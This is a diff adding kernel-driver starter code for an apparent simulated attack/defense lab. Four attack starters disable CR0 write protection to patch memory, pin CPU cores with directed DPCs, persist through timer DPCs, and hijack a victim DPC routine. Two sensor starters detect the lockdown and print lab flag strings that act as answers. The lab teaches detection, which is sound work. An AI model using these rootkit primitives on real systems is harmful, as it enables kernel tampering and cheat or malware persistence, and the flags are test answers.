@@ -251,3 +251,324 @@ NTSTATUS DriverEntry(
     return corrupted ? STATUS_INVALID_BUFFER_SIZE : STATUS_SUCCESS;
 }
 `;
+
+// ---------------------------------------------------------------------------
+// Module 2 attack/defense workshops (m2.l3 / m2.l4). World anchors are the
+// KFWARZ_* constants exported from apps/web/src/scenarios.js:
+//   kvmdrv.sys base   0xfffff8055a700000
+//   victim KDPC       0xfffff8055a701000   ('DPCk' @+0, routine @+8)
+//   canary page       0xfffff8055a702000   (protected range, 64 bytes)
+// ---------------------------------------------------------------------------
+
+export const ATTACK_WPOFF_STARTER = `// ATTACK 1 - WPOFFx64: patch read-only memory inside a raised window (m2.l3)
+//
+// The classic cheat-loader/rootkit primitive: clear CR0.WP while the core
+// sits at DISPATCH_LEVEL so no timer DPC, APC or scheduling slot can
+// interleave with the tamper. mov cr0 itself needs no IRQL - the raise buys
+// an uninterruptible microsecond, not permission.
+//
+// In this lab the "read-only" target is kvmdrv.sys's protected canary page.
+// After loading, prove the damage from the debugger: '!pgscan' shows both
+// the CR0.WP history and the modified bytes.
+//
+// On the irql-hardened world this same source dies at the WP-clear with a
+// modeled CRITICAL_STRUCTURE_CORRUPTION (0x109) - see m2.l4 lab 4.
+
+#include <ntddk.h>
+
+#define CANARY_PAGE 0xfffff8055a702000ULL
+
+static const UCHAR DETOUR[8] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE };
+
+static UINT64 WPOFF(PKIRQL outIrql)
+{
+    *outIrql = KeRaiseIrqlToDpcLevel();
+    UINT64 cr0 = __readcr0();
+    DbgPrint("ATTACK-WPOFF: raised to IRQL %u; CR0 = %p\\n",
+             (unsigned)*outIrql, (PVOID)cr0);
+    __writecr0(cr0 & ~(1ULL << 16));            // WP off
+    _disable();
+    DbgPrint("ATTACK-WPOFF: inside window IRQL=%u WP=%u\\n",
+             (unsigned)KeGetCurrentIrql(),
+             (unsigned)((__readcr0() >> 16) & 1));
+    return cr0;
+}
+
+static void WPON(KIRQL irql, UINT64 cr0)
+{
+    __writecr0(cr0);                            // WP back on
+    _enable();
+    KeLowerIrql(irql);
+}
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    KIRQL irql;
+    UINT64 origCr0 = WPOFF(&irql);
+
+    RtlCopyMemory((void *)CANARY_PAGE, DETOUR, sizeof(DETOUR));
+    DbgPrint("ATTACK-WPOFF: detour copied over canary\\n");
+
+    WPON(irql, origCr0);
+    DbgPrint("ATTACK-WPOFF: window closed; CR0 restored to %p (IRQL %u)\\n",
+             (PVOID)__readcr0(), (unsigned)KeGetCurrentIrql());
+    return STATUS_SUCCESS;
+}
+`;
+
+export const ATTACK_LOCKDOWN_STARTER = `// ATTACK 2 - directed-DPC CPU lockdown (m2.l3)
+//
+// One core raising itself is per-CPU. To touch structures that other CPUs
+// race on, rootkits park EVERY other core at DISPATCH_LEVEL with spinning
+// DPCs (KeSetTargetProcessorDpc), work alone, then release. Seconds of
+// residency trips the real DPC watchdog - and here too: try '!dpcwatchdog'
+// while the cores are pinned.
+//
+// EXERCISE: load as-is and read '!irql -a'. Then comment out the release
+// call, reload, run '!dpcwatchdog' and watch bugcheck 0x133 fire.
+
+#include <ntddk.h>
+
+#define CORES 4
+
+static KDPC g_lockDpc[CORES];
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    KIRQL oldIrql = KeRaiseIrqlToDpcLevel();     // own core -> DISPATCH
+
+    for (ULONG cpu = 1; cpu < CORES; cpu++) {
+        KeInitializeDpc(&g_lockDpc[cpu], NULL, NULL);
+        KeSetTargetProcessorDpc(&g_lockDpc[cpu], (CHAR)cpu);
+        KeInsertQueueDpc(&g_lockDpc[cpu], NULL, NULL);
+        DbgPrint("ATTACK-LOCKDOWN: core %u pinned at IRQL %u\\n",
+                 (unsigned)cpu, (unsigned)KeQueryPerCpuIrql(cpu));
+    }
+
+    DbgPrint("ATTACK-LOCKDOWN: all secondary cores at DISPATCH - kernel "
+             "structures exposed\\n");
+
+    // --- release -----------------------------------------------------------
+    KfReleaseDirectedDpcs();   // <- comment this line for the 0x133 exercise
+    KeLowerIrql(oldIrql);
+    DbgPrint("ATTACK-LOCKDOWN: released; core 1 now at IRQL %u\\n",
+             (unsigned)KeQueryPerCpuIrql(1));
+    return STATUS_SUCCESS;
+}
+`;
+
+export const ATTACK_TIMERDPC_STARTER = `// ATTACK 3 - timer-DPC persistence (m2.l3)
+//
+// A KTIMER bound to your DPC re-arms forever: due in 3 ticks, period 5.
+// Nothing executes until time passes - advance it from the debugger with
+// '!dpcpump 13', then read what happened via '!dpcstat'.
+//
+// This is why EDRs treat an armed timer whose DeferredRoutine lives in an
+// unknown module as persistence, and why '% DPC Time' telemetry exists.
+
+#include <ntddk.h>
+
+static KTIMER g_timer;
+static KDPC   g_dpc;
+static ULONG  g_runs = 0;
+
+static VOID PayloadRoutine(
+    _In_ PKDPC Dpc,
+    _In_opt_ PVOID DeferredContext,
+    _In_opt_ PVOID SystemArgument1,
+    _In_opt_ PVOID SystemArgument2)
+{
+    UNREFERENCED_PARAMETER(Dpc);
+    UNREFERENCED_PARAMETER(DeferredContext);
+    UNREFERENCED_PARAMETER(SystemArgument1);
+    UNREFERENCED_PARAMETER(SystemArgument2);
+    g_runs++;
+    DbgPrint("TIMER-PERSIST: payload run #%u at IRQL %u\\n",
+             (unsigned)g_runs, (unsigned)KeGetCurrentIrql());
+}
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    KeInitializeTimer(&g_timer);
+    KeInitializeDpc(&g_dpc, PayloadRoutine, NULL);
+
+    LARGE_INTEGER due;
+    due.QuadPart = -(LONGLONG)3;            // 3 ticks from now
+    KeSetTimerEx(&g_timer, due, 5, &g_dpc); // ...then every 5 ticks
+
+    DbgPrint("TIMER-PERSIST: armed (due +3, period 5); runs so far %u\\n",
+             (unsigned)g_runs);
+    DbgPrint("TIMER-PERSIST: pump the clock ('!dpcpump 13') to let time happen\\n");
+    return STATUS_SUCCESS;
+}
+`;
+
+export const ATTACK_HIJACK_STARTER = `// ATTACK 4 - KDPC.DeferredRoutine hijack (m2.l3)
+//
+// The queue stores a pointer; pointers can be rewritten. kvmdrv.sys already
+// queued its heartbeat DPC - no allocation, no insertion needed. Overwrite
+// DeferredRoutine in place, then retire the queue with '!dpcdrain': the
+// retire path re-reads the routine from memory, so YOUR function runs at
+// DISPATCH_LEVEL inside the victim's slot.
+//
+// The drain log prints the live routine next to the insert-time snapshot -
+// exactly the forensic artifact defenders grep for. '!pgscan' flags any
+// deferred routine pointing outside known modules.
+
+#include <ntddk.h>
+
+#define VICTIM_DPC 0xfffff8055a701000ULL
+
+static VOID HijackRoutine(
+    _In_ PKDPC Dpc,
+    _In_opt_ PVOID DeferredContext,
+    _In_opt_ PVOID SystemArgument1,
+    _In_opt_ PVOID SystemArgument2)
+{
+    UNREFERENCED_PARAMETER(Dpc);
+    UNREFERENCED_PARAMETER(DeferredContext);
+    UNREFERENCED_PARAMETER(SystemArgument1);
+    UNREFERENCED_PARAMETER(SystemArgument2);
+    DbgPrint("HIJACK-PAYLOAD: victim slot executing attacker code at IRQL %u\\n",
+             (unsigned)KeGetCurrentIrql());
+}
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    PKDPC victim = (PKDPC)VICTIM_DPC;
+    DbgPrint("ATTACK-HIJACK: victim DeferredRoutine was %p\\n",
+             (PVOID)victim->DeferredRoutine);
+    victim->DeferredRoutine = HijackRoutine;
+    DbgPrint("ATTACK-HIJACK: patched in place - retire the queue\\n");
+    return STATUS_SUCCESS;
+}
+`;
+
+export const SENSOR_TELEMETRY_STARTER = `// DEFENSE 1 - telemetry sensor on the pinned world (m2.l4)
+//
+// Behavior over time beats structure snapshots: a clean EPROCESS list with
+// a parked core is still a compromised machine. This sentinel samples the
+// IRQL, reads pending-DPC depth (the modeled stand-in for walking
+// _KPRCB.DpcData), restores DISPATCH_LEVEL and lets you drain.
+
+#include <ntddk.h>
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    KIRQL sampled = KeGetCurrentIrql();
+    ULONG depth = KeQueryDpcQueueDepth();
+    DbgPrint("SENTINEL-TELEMETRY: sampled IRQL = %u queue-depth = %u\\n",
+             (int)sampled, depth);
+
+    if (sampled > DISPATCH_LEVEL || depth > 0) {
+        DbgPrint("SENTINEL-TELEMETRY: anomaly - stranded work on a pinned core\\n");
+        if (sampled > DISPATCH_LEVEL) KeLowerIrql(DISPATCH_LEVEL);
+        DbgPrint("SENTINEL-TELEMETRY: ladder restored to %u secret=kf-watchdog-ok\\n",
+                 (int)KeGetCurrentIrql());
+    } else {
+        DbgPrint("SENTINEL-TELEMETRY: machine healthy\\n");
+    }
+    return STATUS_SUCCESS;
+}
+`;
+
+export const SENSOR_DEADLINE_STARTER = `// DEFENSE 2 - self-watchdog deadline alarm (m2.l4)
+//
+// Anticheats do not trust their own execution context: they schedule a
+// watchdog DPC and alarm when it misses its deadline. This driver performs
+// the Attack-2 lockdown AND arms a watchdog DPC targeted at a pinned core.
+// A healthy core retires it within a tick; a parked one cannot - so the
+// deadline slips and the alarm fires. That is the exact signal
+// BattlEye/EAC-class products raise when someone steals the scheduler.
+
+#include <ntddk.h>
+
+#define CORES 4
+
+static KDPC   g_lockDpc[CORES];
+static KDPC   g_wdDpc;
+static KTIMER g_wdTimer;
+static LONG   g_fired = 0;
+
+static VOID WatchdogRoutine(
+    _In_ PKDPC Dpc,
+    _In_opt_ PVOID DeferredContext,
+    _In_opt_ PVOID SystemArgument1,
+    _In_opt_ PVOID SystemArgument2)
+{
+    UNREFERENCED_PARAMETER(Dpc);
+    UNREFERENCED_PARAMETER(DeferredContext);
+    UNREFERENCED_PARAMETER(SystemArgument1);
+    UNREFERENCED_PARAMETER(SystemArgument2);
+    InterlockedIncrement(&g_fired);
+}
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    // arm the self-watchdog first: periodic, bound to core 1
+    KeInitializeTimer(&g_wdTimer);
+    KeInitializeDpc(&g_wdDpc, WatchdogRoutine, NULL);
+    KeSetTargetProcessorDpc(&g_wdDpc, 1);
+    LARGE_INTEGER due;
+    due.QuadPart = -(LONGLONG)2;
+    KeSetTimerEx(&g_wdTimer, due, 2, &g_wdDpc);
+
+    // then perform the lockdown (attack primitive as test harness)
+    KIRQL oldIrql = KeRaiseIrqlToDpcLevel();
+    for (ULONG cpu = 1; cpu < CORES; cpu++) {
+        KeInitializeDpc(&g_lockDpc[cpu], NULL, NULL);
+        KeSetTargetProcessorDpc(&g_lockDpc[cpu], (CHAR)cpu);
+        KeInsertQueueDpc(&g_lockDpc[cpu], NULL, NULL);
+    }
+    DbgPrint("SENTINEL-WD: cores pinned; core 1 at IRQL %u\\n",
+             (unsigned)KeQueryPerCpuIrql(1));
+
+    // let deadlines pass: each tick query advances the modeled clock
+    LARGE_INTEGER tick;
+    for (int i = 0; i < 12; i++) KeQueryTickCount(&tick);
+
+    if (!g_fired) {
+        DbgPrint("SENTINEL-WD: watchdog DPC did not retire within budget "
+                 "-> DEADLINE-MISSED\\n");
+        DbgPrint("SENTINEL-WD: scheduler stolen - raise telemetry "
+                 "secret=kf-deadline-ok\\n");
+    } else {
+        DbgPrint("SENTINEL-WD: watchdog fired on schedule - healthy core\\n");
+    }
+
+    KfReleaseDirectedDpcs();      // unpin everything
+    KeCancelTimer(&g_wdTimer);    // stop the watchdog before it spams
+    KeLowerIrql(oldIrql);
+    return STATUS_SUCCESS;
+}
+`;
